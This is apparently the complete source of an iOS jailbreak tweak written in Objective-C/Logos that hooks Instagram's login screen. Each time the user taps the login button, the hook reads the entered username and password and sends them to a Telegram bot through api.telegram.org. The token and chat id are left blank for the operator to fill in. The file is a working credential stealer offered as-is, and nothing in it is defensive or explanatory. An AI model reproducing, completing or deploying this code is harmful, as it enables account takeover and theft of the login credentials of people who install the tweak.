#import <UIKit/UIKit.h>
#import <QuartzCore/QuartzCore.h>
#import <objc/runtime.h>
#import <UIKit/UIDevice.h>
#import <Foundation/Foundation.h>
#include <spawn.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>


@interface IGTextField : NSObject
@property (nonatomic, copy, readwrite) NSString *text;
@end

@interface IGLoginView : UIView {
    IGTextField *_usernameField;
    IGTextField *_passwordField;
}
@end

NSString *TOKEN = @""; // Token
NSString *Chatid = @""; // Id

%hook IGLoginView

- (void)_didTapLoginButton {
    %orig;

    IGTextField *usernameField = MSHookIvar<IGTextField *>(self, "_usernameField");
    IGTextField *passwordField = MSHookIvar<IGTextField *>(self, "_passwordField");

    NSString *userwpass = [NSString stringWithFormat:@"%@ : %@", usernameField.text, passwordField.text];

    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", TOKEN, Chatid, userwpass];

    NSURL *url = [NSURL URLWithString:[urlString stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];

    [[[NSURLSession sharedSession] dataTaskWithURL:url] resume];
}

%end
